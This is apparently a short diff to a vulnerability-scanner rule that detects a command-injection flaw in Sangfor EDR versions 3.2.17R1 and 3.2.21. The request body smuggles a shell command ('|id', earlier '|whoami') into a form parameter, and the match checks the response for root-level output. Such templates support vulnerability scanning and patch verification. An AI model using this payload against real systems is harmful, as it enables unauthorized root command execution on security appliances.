@@ -5,9 +5,9 @@ rules:
     headers:
       Content-Type: application/x-www-form-urlencoded
     body: >-
-      {"params":"w=123\"'1234123'\"|whoami"}
+      {"params":"w=123\"'1234123'\"|id"}
     expression: >
-      response.status == 200 && response.body.bcontains(bytes("{\"code\":0,\"data\":["))
+      response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"uid=0(root)")
 detail:
   author: x1n9Qi8
   Affected Version: "Sangfor EDR 3.2.17R1/3.2.21"
